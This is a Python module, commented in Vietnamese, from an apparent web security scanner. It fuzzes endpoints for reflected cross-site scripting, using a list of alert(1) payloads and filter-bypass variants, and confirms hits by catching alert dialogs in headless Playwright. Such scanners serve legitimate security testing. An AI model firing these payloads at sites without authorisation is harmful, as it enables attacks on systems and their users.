# =============================================================================
# fuzzer/xss_fuzzer.py — Kiểm thử Cross-Site Scripting (Reflected XSS)
#
# Kỹ thuật đặc biệt: dùng Playwright headless browser để BẮT alert()
# → Đây là cách xác nhận XSS chính xác nhất, tránh false positive
# → Chỉ khi browser thực sự trigger alert() mới xác nhận là vulnerable
#
# Pipeline:
#   1. Gửi HTTP request thông thường → probe reflection
#   2. Nếu có reflection → dùng Playwright xác nhận alert()
#
# Tham chiếu: OWASP Testing Guide OTG-CLIENT-001, CWE-79
# =============================================================================

import time
import asyncio
import logging
import requests

from playwright.async_api import async_playwright

from fuzzer.models import LogEntry
import config

log = logging.getLogger(__name__)

HEADERS = {"User-Agent": "WebSentinel/1.0"}

# ─── Payload XSS theo context ─────────────────────────────────────────────────
# Tham chiếu OWASP CWE-79
HTML_CONTEXT_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
]

ATTRIBUTE_CONTEXT_PAYLOADS = [
    '"><script>alert(1)</script>',
    '"onmouseover="alert(1)',
    '"><img src=x onerror=alert(1)>',
    "' onmouseover='alert(1)",
]

BYPASS_PAYLOADS = [
    # Case variation bypass
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    # Tag bypass
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    # Encoded
    "&#60;script&#62;alert(1)&#60;/script&#62;",
]

ALL_PAYLOADS = HTML_CONTEXT_PAYLOADS + ATTRIBUTE_CONTEXT_PAYLOADS + BYPASS_PAYLOADS

# Probe text để kiểm tra reflection trước khi dùng Playwright
PROBE_TEXT = "xss_probe_ws_12345"


def fuzz_xss(endpoints: list, ai_payloads: dict = None) -> list[LogEntry]:
    """
    Fuzz XSS cho tất cả endpoint có likely_vulns chứa 'xss'.

    Flow:
      Bước 1: HTTP request với probe text → kiểm tra reflection (nhanh)
      Bước 2: Nếu reflection → HTTP request với XSS payload → kiểm tra
      Bước 3: Nếu tìm thấy candidate → Playwright xác nhận alert() (chính xác)

    Args:
        endpoints:   Danh sách Endpoint
        ai_payloads: Payload bổ sung từ AI {ep_id: [payload,...]}

    Returns:
        Danh sách LogEntry
    """
    targets  = [ep for ep in endpoints if "xss" in ep.likely_vulns]
    all_logs = []

    log.info(f"[xss] Bắt đầu fuzz {len(targets)} endpoints")

    for ep in targets:
        log.info(f"[xss] Testing {ep.method} {ep.url} | params={ep.params}")
        req_count = 0

        for param in ep.params:
            # ── Bước 1: Probe reflection ──────────────────────────────────
            if not _check_reflection(ep, param):
                log.debug(f"[xss] {param} không reflect → bỏ qua")
                continue
            log.debug(f"[xss] {param} có reflection → tiếp tục test")

            # Gộp payload
            payloads = ALL_PAYLOADS.copy()
            if ai_payloads and ep.id in ai_payloads:
                payloads = [p for p in ai_payloads[ep.id]] + payloads

            # ── Bước 2: HTTP fuzz với XSS payload ────────────────────────
            candidates = []  # Các payload có dấu hiệu reflection
            for payload in payloads:
                if req_count >= config.MAX_REQ_PER_EP: break
                entry = _send_http(ep, param, payload)
                if entry:
                    all_logs.append(entry)
                    req_count += 1
                    if entry.is_vulnerable:
                        candidates.append(payload)
                time.sleep(config.FUZZ_DELAY)

            # ── Bước 3: Playwright xác nhận alert() ──────────────────────
            if candidates:
                confirmed = asyncio.run(
                    _playwright_confirm(ep, param, candidates)
                )
                # Cập nhật confidence cho log đã tìm thấy
                for l in all_logs:
                    if (l.endpoint_id == ep.id and l.param == param
                            and l.payload in confirmed):
                        l.confidence     = "high"
                        l.playwright_confirmed = True
                        log.warning(
                            f"[xss] ✅ CONFIRMED by Playwright: "
                            f"{ep.url} param={param} payload={l.payload}"
                        )

    vuln = sum(1 for l in all_logs if l.is_vulnerable)
    confirmed = sum(1 for l in all_logs if getattr(l, "playwright_confirmed", False))
    log.info(f"[xss] Xong — {len(all_logs)} requests | "
             f"{vuln} suspect | {confirmed} confirmed by browser")
    return all_logs


# ─── Bước 1: Probe reflection ─────────────────────────────────────────────────

def _check_reflection(ep, param) -> bool:
    """
    Gửi probe text → kiểm tra xem param có được reflect trong response không.
    Nếu không reflect → bỏ qua, không cần test XSS → tránh false positive.
    """
    try:
        params = {p: ("test" if p != param else PROBE_TEXT) for p in ep.params}
        if ep.method == "GET":
            resp = requests.get(ep.url, params=params, headers=HEADERS,
                                timeout=config.REQUEST_TIMEOUT)
        else:
            resp = requests.post(ep.url, data=params, headers=HEADERS,
                                 timeout=config.REQUEST_TIMEOUT)
        return PROBE_TEXT in resp.text
    except Exception:
        return False


# ─── Bước 2: HTTP fuzz ────────────────────────────────────────────────────────

def _send_http(ep, param, payload) -> LogEntry | None:
    """Gửi payload qua HTTP, phát hiện reflection cơ bản."""
    try:
        t0 = time.time()
        params = {p: ("test" if p != param else payload) for p in ep.params}

        if ep.method == "GET":
            resp = requests.get(ep.url, params=params, headers=HEADERS,
                                timeout=config.REQUEST_TIMEOUT, allow_redirects=True)
            req_info = {"url": resp.url, "method": "GET",
                        "params": params, "payload": payload}
        else:
            resp = requests.post(ep.url, data=params, headers=HEADERS,
                                 timeout=config.REQUEST_TIMEOUT, allow_redirects=True)
            req_info = {"url": ep.url, "method": "POST",
                        "params": params, "payload": payload}

        ms   = int((time.time() - t0) * 1000)
        body = resp.text

        vuln, conf = _detect_http(payload, body)
        snippet    = _extract_snippet(body, payload)

        return LogEntry(
            endpoint_id=ep.id, url=ep.url, param=param,
            vuln_type="xss", payload=payload,
            technique="http_reflection",
            request=req_info,
            response={"status": resp.status_code,
                      "length": len(resp.content),
                      "body_snippet": snippet},
            baseline={},
            is_vulnerable=vuln, confidence=conf, duration_ms=ms,
        )
    except requests.RequestException as e:
        log.debug(f"[xss] HTTP lỗi: {e}")
        return None


def _detect_http(payload: str, body: str) -> tuple[bool, str]:
    """
    Phát hiện reflection qua HTTP response.
    Chú ý: đây chỉ là SUSPECT, cần Playwright xác nhận để tránh false positive.
    """
    body_lower = body.lower()

    # Payload xuất hiện nguyên xi → HIGH suspect
    if payload.lower() in body_lower:
        return True, "medium"  # medium vì chưa xác nhận alert()

    # HTML encoded → MEDIUM suspect
    encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
    if encoded.lower() in body_lower:
        return True, "low"

    return False, "none"


# ─── Bước 3: Playwright xác nhận alert() ─────────────────────────────────────

async def _playwright_confirm(ep, param, candidate_payloads: list) -> list[str]:
    """
    Dùng Playwright mở browser thật → inject payload → kiểm tra alert() có trigger không.
    Đây là cách DUY NHẤT để xác nhận XSS 100% chính xác.

    Returns:
        Danh sách payload đã được xác nhận trigger alert()
    """
    confirmed = []

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-setuid-sandbox"],
        )
        context = await browser.new_context()

        for payload in candidate_payloads:
            page = await context.new_page()
            alert_triggered = False
            alert_message   = ""

            # Hook dialog (alert/confirm/prompt)
            async def on_dialog(dialog):
                nonlocal alert_triggered, alert_message
                alert_triggered = True
                alert_message   = dialog.message
                await dialog.accept()

            page.on("dialog", on_dialog)

            try:
                # Build URL với payload
                params = {p: ("test" if p != param else payload)
                          for p in ep.params}

                if ep.method == "GET":
                    from urllib.parse import urlencode
                    url = f"{ep.url}?{urlencode(params)}"
                    await page.goto(url, wait_until="domcontentloaded",
                                    timeout=10000)
                else:
                    # POST: dùng JS để submit form
                    await page.goto(ep.url, wait_until="domcontentloaded",
                                    timeout=10000)
                    await page.evaluate(f"""() => {{
                        const form = document.querySelector('form');
                        if (form) {{
                            {_build_form_fill_js(params)}
                            form.submit();
                        }}
                    }}""")

                # Đợi ngắn để alert có thể trigger
                await page.wait_for_timeout(2000)

            except Exception as e:
                log.debug(f"[xss] Playwright error: {e}")
            finally:
                await page.close()

            if alert_triggered:
                confirmed.append(payload)
                log.info(f"[xss] 🎯 Alert confirmed! payload={payload!r} "
                         f"message={alert_message!r}")

        await browser.close()

    return confirmed


def _build_form_fill_js(params: dict) -> str:
    """Sinh JS code để điền form trước khi submit."""
    lines = []
    for name, value in params.items():
        safe_val = value.replace("'", "\\'").replace("\n", "\\n")
        lines.append(
            f"const el_{name} = document.querySelector('[name=\"{name}\"]');"
            f"if (el_{name}) el_{name}.value = '{safe_val}';"
        )
    return "\n".join(lines)


def _extract_snippet(body: str, payload: str) -> str:
    """Trích đoạn body quanh payload để AI phân tích."""
    idx = body.lower().find(payload.lower()[:15])
    if idx != -1:
        return body[max(0, idx-100): idx+500]
    return body[:800]